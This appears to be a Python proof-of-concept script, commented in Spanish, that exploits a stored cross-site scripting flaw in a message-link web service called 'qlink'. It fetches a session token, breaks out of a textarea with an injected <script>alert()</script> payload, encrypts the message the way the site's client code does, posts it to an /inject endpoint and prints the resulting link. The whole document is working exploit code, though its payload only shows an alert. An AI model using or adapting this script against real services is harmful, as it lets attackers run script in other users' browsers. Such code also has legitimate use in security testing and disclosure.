# -*- coding: utf-8 -*-

import requests
import base64
import binascii
import hashlib
from Crypto.Cipher import AES
import math
import time

###############################################################################

url = 'http://qlink'
mensaje_ql = 'Mensaje de prueba'
alert = 'Prueba XSS'

###############################################################################

# sesión de módulo requests, para usar keep-alive
sess = requests.Session()

# encabezados http, copiados de un navegador
headers = {
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'es-419,es;q=0.8',
        'Connection':'keep-alive',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Host':url.replace('http://', '').replace('https://', ''),
        'Origin':url,
        'Referer':url+'/',
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'
}

# obtener token fresco
r = sess.get(url + '/tokenizer', headers=headers, data={})

x_token = r.json()['x_token']

# generar parámetro simulando javascript de Date().getTime()
random_hash = int(time.time()) * 1000

# mensaje
mensaje = mensaje_ql + "</textarea><script>alert('" + alert + "')</script>"
mensaje = "%%A%%" + mensaje + "%%C%%"

# password, salt e iv cualesquiera
password = b'123456'
salt = "ffffffffffffffff"
iv = "ffffffffffffffffffffffffffffffff"
iters = 100

# generación de llave para aes, simulando también versión original javascript
llave = hashlib.pbkdf2_hmac('sha1', password, binascii.unhexlify(salt), iters, dklen=32)

# cifrado
cipher = AES.new(llave, AES.MODE_CBC, binascii.unhexlify(iv))
data = base64.b64encode(cipher.encrypt(mensaje.ljust(int(math.ceil(len(mensaje) / 16.0) * 16), b'\0')))

# para envío a web-service
data = {
        'msg':'{"data":"' + data + '","salt":"' + salt + '","iv":"' + iv + '","iter":' + str(iters) + ',"decom":"false"}',
        'imprint':'false',
        'captcha':'false',
        'randomHash':random_hash,
        'from':'web_app',
        'x_token':x_token,
        'lang':'es',
        'replyIntent':'false',
        'n':'180'
}

# envío a servidor e impresión de qlink generado
r = sess.post(url + '/inject', headers=headers, data=data)
print 'mensaje del qlink: ' + mensaje_ql
print 'mensaje para alert(): ' + alert
print 'qlink: ' + r.json()['hash'] + '#' + password

